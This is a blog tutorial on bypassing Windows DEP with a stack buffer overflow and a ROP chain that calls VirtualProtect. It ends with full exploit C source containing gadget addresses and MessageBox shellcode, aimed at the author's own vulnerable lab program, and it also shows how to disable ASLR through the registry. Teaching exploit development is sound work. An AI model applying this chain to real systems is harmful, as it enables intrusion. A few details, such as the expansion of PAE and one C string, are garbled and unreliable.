# Bypassing Data Execution Prevention on Windows NT

This is the part one of the "Bypassing Windows security mitigations" series. In this article I will cover the protection related to DEP (Data Execution Prevention). When a specified process is hijacked/exploited, if DEP is enabled, the malicious code (shellcode) that resides on stack/heap will not be executed due to DEP marking these as non-executable.

This is the list of requirements being these related to software and user base skills.

| Requirements            |
| ----------------------- |
| Windows 32 bits         |
| OllyDbg                 |
| Dev-Cpp + GCC compiler* |
| Basic ASM skills        |
| Patience                |

*Last version is 5.11 from 2015. This IDE is a nice alternative for Visual Studio for dev in C/C++.

Before going into the rough explanation of how to circumvent this protection, I need to explain that if you run Windows x86 you need to enable PAE first then DEP. In x64 it's enabled by default. So you will wonder, what's PAE? 

PAE stands for Physical Address Execution, is a technique implemented on Windows specially for 32 bit versions that gives the system an improved memory capability that allows the CPU to change the addressing mode to 64 bit, therefore applications can access more than 4GB but will retain their 4GB virtual address space, this will enhance the performance impact on the OS since less paging will be made.

In addition PAE will introduce DEP as a built-in feature. That's why so important to enable PAE if you are running x86 version. No need to worry if you are under x64 version.

So far so good, the following questions will be targeted on these article:

[TOC]

## What vulnerability do I use to exploit and run code?

In this article I'm using a Buffer Overflow to smash the stack in order to overwrite the return address. When the program returns from a function it will jump to the caller function (the previous one), but if the return addres is overwritten, it will return to what it's there, in exploiting means, this is a pointer to our shellcode. DEP will prevent code to be executed on the stack, then thwarting DEP is essencial to execute our shellcode.

Summarizing: Imagine you've declared a string on the main function of your program and you want to print it through printme() function. printme() will copy our string to a temp buffer then print it. As you see this is a dummy behaviour without bound checking (the whole string is copied into a fixed temp buffer, still can't see the overflow? I show you then!)

```c
#include <stdio.h>
#include <string.h>

void printme(char *buf){
    char tmp[10];
    strcpy(tmp, buf);
    printf("%s", tmp);
}

int main (int argc, char **argv){
    char *buf = "Hello World!\n";
    printme(buf);
    return 0;
}
```

Before printme(buf) the stack can be viewed as:

| Stack     |
| --------- |
| ESP-> buf |
| main_ebp  |

When printme(buf) is reached it will perform a:

```nasm
PUSH ESP ; will put buf pointer onto stack, param for strcpy
CALL printme ; push return address onto stack and transfer EIP there
```

When the call to printme() is made, it will begin with the function prologe. Just save old EBP, setup a new stack frame and point EBP to this new value:

```nasm
printme:

PUSH EBP
MOV EBP, ESP ; End of prologe (frame created)
SUB ESP, 0xA ; Allocate 10 bytes for tmp string
MOV EAX, [EBP+8] ; pointer to buf
MOV EDX, ESP ; pointer to tmp
PUSH EAX ; push pointer to buf
PUSH EDX ; push pointer to tmp
CALL strcpy
```

Before calling strcpy, the stack will contain:

| Stack          |
| -------------- |
| tmp_ptr        |
| buf_ptr        |
| tmp            |
| printme_ebp    |
| return_address |
| buf_ptr        |
| buf            |
| main_ebp       |

strcpy() will put all the data of buf in tmp, as a consequence if you write more data (bytes) than tmp can't handle an overflow will happen. Here comes the funny part, the last stack view tell us that tmp is above printme_ebp and return_address. These two take 4 bytes each so you only need to overwrite 8 bytes after you fill up tmp with whatever you want.

Let's make a base calculation to know how many bytes to write for triggering an overflow + overwrite of return_address. Note that each memory address is 4 bytes.

tmp has 10 bytes = 2 addresses of 4 bytes full + 2 bytes of a third address -> 12 bytes to fillup, but 2 zero bytes left on the last addres, and can't leave zeros so -> 14 bytes
printme_ebp - > 4 bytes
return_address -> 4 bytes

Total = 20 bytes

A rule of thumb to follow when calculating how many bytes are needed to overflow + ovewrite the return_address is:

![total_bytes] = sizeof(tmp) + sizeof(tmp) mod 8 + 8

You'd said, nice we know the theory but I'd like a live example. And here it's on C language:

```c
#include <stdio.h>
#include <string.h>

void printme(char *buf){
    char tmp[10];
    strcpy(tmp, buf); // will overflow tmp and smash stack
    printf("%s", tmp);
}

int main (int argc, char **argv){
    char *buf = "XXXXXXXXXXXXXXXXXXXX; // 20 bytes to overwrite return_address
    printme(buf);
    return 0;
}
```
Before printme() returns the stack will look like:

| Stack                              |
| ---------------------------------- |
| 58585858 (4 bytes = 8 hex, 58_h=X) |
| 58585858                           |
| 58585858                           |
|58585858| (printme_ebp)
|58585858 (return_address)|
|buf_ptr|
|buf|
|main_ebp|

As seen before 20 bytes are needed to overflow tmp and overwrite return_address. 0x58 is 'X' in hex and equals to 1 byte, each address contains 4 bytes. When printme() returns to main(), EIP will point to return_address, this is, will jump to what return_address points to.

## How do I trigger DEP to block the execution of code?

As seen before printme() will return to return_address=0x58585858. It's an invalid address so it will trigger and ACCESS_VIOLATION. Remember that since the stack is non-executable DEP would block our attempt in the case of placing a valid pointer to our shellcode.

## How do I execute code if DEP is enabled and blocking my own code (shellcode)?

Now you should be struggling with the fact that DEP is blocking any execution attempt if the return address jumps to our shellcode. The trick is making the stack executable to execute shellcode instructions like a normal explotation scenario. For this to work DEP must be bypassed, well the Windows API provides useful functions to change the permissions of a memory page. VirtualProtect is one of these that performs nicely. But you should be asking, how can I can setup VirtualProtect parameters and call it? With a technique called ROP.

## What is a ROP chain?

ROP (Return Oriented Programming) is a technique used for chaining multiple functions (gadgets) from any module of the program to accomplish shellcode execution. It works because the gadgets are located inside any .DLL/module loaded in the Virtual Space Address of the program. These gadgets are marked as executable, so it's perfect to use them to chain multiple instructions to setup registers and finally call VirtualProtect.

```c
BOOL WINAPI VirtualProtect(
  _In_  LPVOID lpAddress,
  _In_  SIZE_T dwSize,
  _In_  DWORD  flNewProtect,
  _Out_ PDWORD lpflOldProtect
);
```

Yeah seems cool but... how can I chain these gadgets and trigger the execution of the ROP chain? Remember the previous stack view? Well the return address should be overwritten with the address of the first gadget. Then the first gadget will perform and return into the second gadget and so on. Until calling VirtualProtect.

| Stack          |
| -------------- |
| 58585858 (tmp) |
| 58585858       |
| 58585858       |
|58585858| (printme_ebp)
|gadget_1 (return_address)|
|gadget_2|
|gadget_n|
|shellcode|

## How do other protections affect DEP impact on security?

There exist more protections that work nicely in combination with DEP. The best is ASLR. ASLR randomizes the base address of each module every time the system reboots. Why is ASLR so important? Well these ROP gadgets are addresses that need to be known on every execution. If ASLR changes the base address of any of the modules where gadgets reside, then these gadgets are rebased and printme() will fail since returns to the first gadget which its address is invalid.

This can be seen as:

gadget_address = module_base_address + static_offset + ASLR_offset

If ASLR is disabled then ASLR_offset=0 so the gadget_address will be always constant. Without ASLR, DEP is weak because our gadgets will work every time, their address will never change and we will be able to bypass it without struggling with ASLR rebasing.

If ASLR is enabled then ASLR_offset=rand and the gaget_address will change on every reboot. This makes our exploit unreliable at the very first time. There are other means to bypass ASLR but that's for a further article of this series.

## Do I need to disable other protection(s) for this test?

It's desirable that you disable ASLR or you will have to find every gadget address after each reboot due to ASLR rebasing base addresses. To disable ASLR on Windows follow these steps:

Create a DWORD value named MoveImages in the registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management with value 0. Then reboot and ASLR will be turned off. It's the turn to use OllyDbgr and browse modules instructions.

## Common mistakes made when building ROP chains

At this point you should have seen how to take advantage of a Buffer Overflow to overwrite the return address of the current stack frame. Also, you learnt that DEP will trigger, and prevent any attempt of execution, since the stack is marked as non-executable. Then you understood that bypassing DEP means to mark the stack as executable, so you are now trying to locate some juicy gadgets to chain and achieve a call to VirtualProtect that marks stack as executable. This last step is what is covered here.

A very common mistake made by beginners is to attempt to build the stack with VirtualProtect parameters using Push + ret gadgets. Imagine your first gadget wants to push the last argument of VirtualProtect (dwOld). Since dwOld is a pointer to an address, you can use ESP.

| Stack         |
| ------------- |
| EIP->gadget_1 |
| gadget_2      |

```nasm
gadget_1:
PUSH ESP ; push ptr to stack (dwOld)
RET ; return to what is on dwOld
```
| Stack      |
| ---------- |
| gadget_1   |
| EIP->dwOld |
| gadget_2   |

Now you have broken the ROP chain calling an address outside the chain. This is not desirable, undefined behaviour will occur. Chain order should be always respected.

Another common mistake is to not place junk or valid pointer/data when a pop reg is met. The initial stack is the following:

| Stack         |
| ------------- |
| EIP->gadget_1 |
| gadget_2      |
| gadget_3      |

if the selected gadget (that's gadget_1) for example is:

```asm
ADD EAX, 40
POP EBP
RETN
```

| Stack                    |
| ------------------------ |
| gadget_1                 |
| gadget_2 (popped on EBP) |
| EIP->gadget_3            |

gadget_2 adress will be popped into EBP and RETN will jump to gadget_3. What happened? we broke the chain since gadget_2 won't be executed.

To avoid popping gadgets into registers you need to use junk like '41414141' (i.e four A's). Sometimes pop reg instructions are useful to place pointer to functions inside a registers, even fixed values. Once junk is added stack looks this way:

| Stack                    |
| ------------------------ |
| EIP->gadget_1            |
| 41414141 (popped on EBP) |
| gadget_2                 |
| gadget_3                 |

when gadget_1 finishes EBP will contain 41414141 and RETN will jump to gadget_2. Chain is executing correctly in order!

When all the gadgets of the chain finish execution the stack will look similar too:

| Stack               |
| ------------------- |
| EIP->VirtualProtect |
| lpAddress           |
| dwSize              |
| MEM_CONST           |
| dwOld               |
| shellcode           |

And I say similar since some registers must be set to NOP ROPs, but this will be discussed later. This is just a simple approach to you, here you learn the order of the stack params after the last gadget execution. What is true is that VirtualProtect is going to be called and has all the parameters in order.

The key here is to setup registers and push them all at same time, this is a PUSHAD + RET gadget on the bottom of the chain.

PUSHAD: Push EAX, ECX, EDX, EBX, original ESP, EBP, ESI, and EDI

PUSHAD will push EDI first then ESI etc. Then VirtualProtect address must be on EDI, lpAddress on ESI. This isn't true for my schema, as discussed later, but this is an introduciton to why use these registers, since PUSHAD pushes them in this order.

| Stack                   |
| ----------------------- |
| EDI->VirtualProtect     |
| ESI->lpAddress          |
| EBP->dwSize             |
| original ESP->MEM_CONST |
| EBX->dwOld              |
| EDX                     |
| ECX                     |
| EAX                     |
| shellcode               |

Okay what we can learn from the previous stack view? EDX, ECX and EAX are unused and original ESP is used for dwOld parameter.  Shellcode address must be on ESI when PUSHAD is made, so before PUSHAD's gadget ESP must be pushed and popped to a register then moved to ESI, or done directly by PUSH ESP+POP ESI/MOV ESI, ESP. 

My experience is that these instructions hardly exist inside the program's binary, a trick to handle this is to take advantage of original ESP to point to shellcode address (lpAddress), when PUSHAD is made ESP points to shellcode, this is the most important thing to remember. However original ESP is used for MEM_CONST, we need to reorganize the stack to place lpAddress on ESP. Let's use NOP ROPs, these are just RET gadgets.

```nasm
RET ; This is a NOP ROP
```

| Stack                   |
| ----------------------- |
| EDI->NOP ROP            |
| ESI->VirtualProtect     |
| EBP->NOP ROP            |
| original ESP->lpAddress |
| EBX->dwSize             |
| EDX->MEM_CONST          |
| ECX->dwOld              |
| EAX                     |
| shellcode               |

If we managed to setup registers this way, after PUSHAD + RET the first NOP ROP will execute, then VirtualProtect, then second NOP ROP, then return to EAX. To EAX since VirtualProtect used all parameters and EAX remains unused. Summarizing, after VirtualProtect, program returns to what is on EAX (PUSH ESP + RET), and shellcode will run. 

VirtualProtect will work as expected marking lpAddress (shellcode) as executable in the stack. Then As you noticed NOP ROPs help a lot when dealing with shellcode pointer placement into lpAddress parameter.

Now we just need to know where to locate these gadgets inside executable's modules. In the last stackview you can see which register holds each parameter. Remember that if ASLR is enabled these addresses will change on every reboot.

## Using the Debugger to build a ROP Chain

Load the executable into OllyDbg, now lets examine printme() code:

```nasm
00401500  /$ 55             PUSH EBP
00401501  |. 89E5           MOV EBP,ESP
00401503  |. 83EC 28        SUB ESP,28
00401506  |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]             ; |
00401509  |. 894424 04      MOV DWORD PTR SS:[ESP+4],EAX             ; |
0040150D  |. 8D45 EE        LEA EAX,DWORD PTR SS:[EBP-12]            ; |
00401510  |. 890424         MOV DWORD PTR SS:[ESP],EAX               ; |
00401513  |. E8 70830100    CALL <JMP.&msvcrt.strcpy>                ; \strcpy
00401518  |. C9             LEAVE
00401519  \. C3             RETN
```
ESP will point to tmp address (EBP-12), and ESP+4 to our buffer. When overflow happens we control return address (EIP). This address must be a valid gadget address, for example dwSize, must be the size of the shellcode On ASM making INC EBX 40 times will suffice. Also MEM_CONST must be 0x40 (PAGE_EXECUTE_READWRITE), adding 40 to EAX then mov to EDX will do it. Lets find these instructions on loaded DLLs with OllyDbg.

Everytime the executable is loaded, several DLLs are loaded, i.e: runtime C DLL (msvcrt) and WinAPI DLLs (ntdll (syscalls), kernel32, kernelBase...). This means that all aplications use these, so locating gadgets here can be very useful to reuse gadgets across multiple executables.

Press Ctrl+E to view current loaded modules:


|Base       |Size       |Entry      |Name       |File version       |Path                                   |
------------|-----------|-----------|-----------|-------------------|---------------------------------------|
|00400000   |000E5000   |004014E0   |Dummy      |                   |C:\Users\kub0x\Desktop\Dummy\Dummy.exe |
|0DCE0000   |0004A000   |0DCE7DE0   |KERNELBA   |6.1.7600.16385     |C:\Windows\system32\KERNELBASE.dll     |
|6FF50000   |000AC000   |6FF5A472   |msvcrt     |7.0.7600.16385     |C:\Windows\system32\msvcrt.dll         |
|77DE0000   |000D4000   |77E2BDE4   |kernel32   |6.1.7600.16385     |C:\Windows\system32\kernel32.dll       |
|77EC0000   |0013C000   |           |ntdll      |6.1.7600.16385     |C:\Windows\SYSTEM32\ntdll.dll          |

Select ntdll and press Ctrl+S (search for multiple instructions). Lets find an INC EBX instruction followed by a ret:

```nasm
G1:
		77EF8450   43               INC EBX
		77EF8451   C3               RETN
```

Hit enter and you will arrive at 0x77EF8450, write it down somewhere in your notes and call it G1. Congrats, now you have a gadget to increase EBX, this is increment dwSize until hit shellcode size. Remember that you have to turn off ASLR for having the same Virtual Address Space as on this article.

As seen, this is quite easy with the help of multiple search, also you can take more advantage of it, sometimes you need to move values between registers. Imagine you have MEM_CONST on EAX (0x40), but you really need it on EDX, so try to get an instruction like, :

```nasm
MOV EDX, EAX
ANY n
RET
```
ANY covers the case where n (ranges from 1 to 8) instructions are between MOV and RET. Also you can use:

```nasm
PUSH EAX
POP r32
ANY n
RET
```
Now you have the value of EAX in one of the registers. r32 will be revealed once you hit 'Find'. When you discover what register it is, just find another gadget that moves that register to EDX. I compare ROP chain to solving puzzles, multiple ways but the same result.

In the case of EAX, you can place MEM_CONST (0x40 value) there, first make EAX zero (XOR EAX, EAX), then add 40 and move it to EDX. This is summarized into three gadgets G2, G3 and G4:

```asm
G2:
		6FF5DC4D   33C0             XOR EAX,EAX
		6FF5DC4F   C3               RETN
G3:
		77F8C22E   83C0 40          ADD EAX,40
		77F8C231   5D               POP EBP
		77F8C232   C3               RETN
G4:
		77EF5B6C   8BC8             MOV ECX,EAX
		77EF5B6E   8BC2             MOV EAX,EDX
		77EF5B70   8BD1             MOV EDX,ECX
		77EF5B72   C3               RETN
```

Well done. We have setup EBX (dwSize) and EDX (MEM_CONST). Let's setup now ECX this is dwOld a pointer to the previous MEM_CONST value. Since it's a pointer, we can use ESP for this purpose, ESP is a pointer to the top of the stack.

A naive attempt would be to look for a gadget that contains PUSH ESP and expect to find a POP ECX few instructions below followed by a RET.

```nasm
PUSH ESP
Any n
POP ECX
Any n
RET
```

Any ranges from 1 to 8. In my opinion I don't like to be n > 4.

Naive attempts still continue, you can try to look for:

```nasm
MOV ECX, ESP
ANY n
RET
```

Even you can introduce more difficulty:

```nasm
MOV r32, ESP
ANY n
MOV ECX, r32
ANY n
RET
```

And pray for r32 on the two MOVs to be the same register. Same applies to POP instructions with two r32 expressions.

In my case, I found the following gadget to PUSH ESP and move it to ECX in 3 gadgets:

```nasm
G5:
		77F62992   54               PUSH ESP
		77F62993   8BC7             MOV EAX,EDI
		77F62995   5F               POP EDI ;Junk
		77F62996   5E               POP ESI ;Junk
		77F62997   5D               POP EBP ;NOP ROP
		77F62998   C2 0400          RETN 4
G6:
		6FF7992D   8BC7             MOV EAX,EDI
		6FF7992F   5F               POP EDI ;NOP ROP
		6FF79930   C3               RETN
G7:
		77EF475D   8BC8             MOV ECX,EAX
		77EF475F   8BC6             MOV EAX,ESI
		77EF4761   5E               POP ESI ;VirtualProtect Address
		77EF4762   C2 1000          RETN 10
```

Pushes ESP onto stack (dwOld param), pops it into EDI, moves EDI into EAX and finally EAX is moved into ECX. Now we have dwOld parameter on ECX. We are closer to finish our ROP chain.

On G5 junk is popped onto EDI and ESI and NOP ROP on EBP. On G6 a NOP ROP is popped to EDI and finally on 67 VirtualProtect's Address is popped onto ESI.

As I said before, VirtualProtect returns to what's on EBP, since EBP is a NOP ROP, this is a plain RET instruction, then returns to what's on EAX. EAX must be a PUSH ESP + RET gadget, since ESP points to our shellcode in this moment.

```asm
		6FF8606D   54               PUSH ESP
		6FF8606E   C3               RETN
```

We need to pop 0x6FF8606D onto EAX. Find a gadget POP EAX + RET

```nasm
G8:
		6FF8181F   58               POP EAX
		6FF81820   C3               RETN
```

Alright, all registers are setup now. Let's push them onto stack with PUSHAD. Find a PUSHAD + RET gadget:

```asm
G9:
		6FFB5CF4   60               PUSHAD
		6FFB5CF5   C3               RETN
```

after PUSHAD the stack looks like this:

| Stack                   |
| ----------------------- |
| EDI->NOP ROP            |
| ESI->VirtualProtect     |
| EBP->NOP ROP            |
| original ESP->lpAddress |
| EBX->dwSize             |
| EDX->MEM_CONST  |
| ECX->dwOld              |
| EAX->PUSH+RET       |
| shellcode                   |

This is the ROP Chain I've built. After strcpy, when overflow happens, we overflow with junk until hit the return address, there we put our ROP Chain. The stack on my schema before ROP execution is:

|Stack|
|-------|
|G1|
|G2|
|G3|
|Junk|
|G4|
|G5|
|junk|
|NOP ROP|
|G6|
|Junk|
|NOP ROP|
|G7|
|VirtualProtect Address|
|G8|
|junk|
|junk|
|junk|
|junk|
|PUSH ESP+RET|
|G9 (PUSHAD + RET)|

Junks are used for the POP REG instructions, so the following gadgets are not popped and chain order is followed correctly. I've explained this before on the common mistakes section.

## The Exploit and the ROP chain together:

At this point you are familiarized with ROP chaining concept, besides you can locate useful gadgets inside loaded modules (DLLs). In addition you know the register's order to perform the VirtualProtect call. It's your work now to complete the rest of the exploit, it is easy but challenging if it's your first time. I'm giving the whole ROP chain and C source, so you can understand and debug it step by step. You will notice how the chain is followed until PUSHAD.

```c
#include <windows.h>
#include <string.h>

/* STACK SHOULD BE THIS WAY AFTER STRCPY AND BEFORE ROP EXECUTION
G1, G2, G3, Junk, G4, G5, junk, ROP NOP, G6, Junk, ROP NOP, G7, Vprotect, G8, junk, junk, junk, junk, PUSHESP+RET, G9

This form guarantees explotaiton since VProtect will mark SHCode as executable and will return to SHCode.
*/
/* STACK AFTER ROP EXECUTION (pushad will make look like this):

NOP ROP, VProtect, NOP ROP, shellcodeptr, dwsize, memconst, oldvalue, PUSH ESP+RET, shellcode 
*/

/* ROP CHAIN
		G1:
		77EF8450   43               INC EBX
		77EF8451   C3               RETN
		G2:
		6FF5DC4D   33C0             XOR EAX,EAX
		6FF5DC4F   C3               RETN
		G3:
		77F8C22E   83C0 40          ADD EAX,40
		77F8C231   5D               POP EBP
		77F8C232   C3               RETN
		G4:
		77EF5B6C   8BC8             MOV ECX,EAX
		77EF5B6E   8BC2             MOV EAX,EDX
		77EF5B70   8BD1             MOV EDX,ECX
		77EF5B72   C3               RETN
		G5:
		77F62992   54               PUSH ESP
		77F62993   8BC7             MOV EAX,EDI
		77F62995   5F               POP EDI
		77F62996   5E               POP ESI
		77F62997   5D               POP EBP
		77F62998   C2 0400          RETN 4
		G6:
		6FF7992D   8BC7             MOV EAX,EDI
		6FF7992F   5F               POP EDI
		6FF79930   C3               RETN
		G7:
		77EF475D   8BC8             MOV ECX,EAX
		77EF475F   8BC6             MOV EAX,ESI
		77EF4761   5E               POP ESI
		77EF4762   C2 1000          RETN 10
		G8:
		6FF8181F   58               POP EAX
		6FF81820   C3               RETN
		G9:
		6FFB5CF4   60               PUSHAD
		6FFB5CF5   C3               RETN

*/

/*  IMPORTANT INSTRUCTIONS AND ADDRESSES:

		After VirtualProtect it returns to whatever is on EAX, must jump to our shellcode:
		
		6FF8606D   54               PUSH ESP
		6FF8606E   C3               RETN
		
		NOP ROP -> 6FFB5CF5   C3    RETN
		
		VirtualProtect -> 0x0DD022BD
	
		MessageBox -> 0x77D6EA11

*/

/*  Shellcode in ASM:
	    
		XOR EAX, EAX
		PUSH EAX
		PUSH 0x21216465
		PUSH 0x6E776F70
		MOV EBX, ESP
		PUSH EAX
		PUSH EBX
		PUSH EBX
		PUSH EAX
		MOV EAX, 0x77D6EA11
		CALL EAX
		
		To get opcodes paste it into https://defuse.ca/online-x86-assembler.html
		
		C-string: "\x31\xC0\x50\x68\x65\x64\x21\x21\x68\x70\x6F\x77\x6E\x89\xE3\x50\x53\x53\x50\xB8\x11\xEA\xD6\x77\xFF\xD0"
*/


void printme(char *buf){
	char tmp[10];
	strcpy(tmp, buf);
}

int main(int argc, char** argv) {
	//If we want to spawn a MsgBox we need user32.dll
	//Could ASM-Pinvoke though
	LoadLibraryA("user32.dll");
	char *buf="AAAAAAAAAAAAAAAAAA"
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x50\x84\xEF\x77" //G1
	"\x4D\xDC\xF5\x6F"//G2
	"\x2E\xC2\xF8\x77" //G3 77F8C22E
	"\x41\x41\x41\x41" //junk
	"\x6C\x5B\xEF\x77" //G4 77EF5B6C
	"\x92\x29\xF6\x77" //G5 77F62992
	"\x41\x41\x41\x41" //junk
	"\xF5\x5C\xFB\x6F" //NOP ROP 6FFB5CF5
	"\x2D\x99\xF7\x6F" //G6 6FF7992D
	"\x41\x41\x41\x41" //junk
	"\xF5\x5C\xFB\x6F" //NOP ROP 6FFB5CF5
	"\x5D\x47\xEF\x77" //G7 77EF475D
	"\xBD\x22\xD0\x0D" //Vprotect 77E22341
	"\x1F\x18\xF8\x6F" //G8 6FF8181F
	"\x41\x41\x41\x41" //junk
	"\x41\x41\x41\x41" //junk
	"\x41\x41\x41\x41" //junk
	"\x41\x41\x41\x41" //junk
	"\x6D\x60\xF8\x6F" //push esp + ret for eax 6FF8606D
	"\xF4\x5C\xFB\x6F" //PUSHAD 6FFB5CF4
	"\x31\xC0\x50\x68\x65\x64\x21\x21\x68\x70\x6F\x77\x6E\x89\xE3\x50\x53\x53\x50\xB8\x11\xEA\xD6\x77\xFF\xD0"; //Our shellcode that will be called after Vprotect rets on pushed EBP
	printme(buf);
	return 0;
}
```

Use OllyDbg step-by-step and see how the ROP Chain is executed gadget by gadget. Of course you need the same OS I used and ASLR disabled. You can always search for the gadgets I gave above in the executable with OllyDbg, once you find the new addresses substitute on the source code and the exploit should work.

## Useful Links

https://defuse.ca/online-x86-assembler.html

https://en.wikibooks.org/wiki/X86_Disassembly/Calling_Conventions

https://technet.microsoft.com/en-us/library/cc728455(v=ws.10).aspx

https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx

https://en.wikipedia.org/wiki/Stack_buffer_overflow

https://en.wikipedia.org/wiki/Executable_space_protection#Windows

https://en.wikipedia.org/wiki/Return-oriented_programming

https://en.wikipedia.org/wiki/Return-to-libc_attack

https://en.wikipedia.org/wiki/Address_space_layout_randomization

https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/
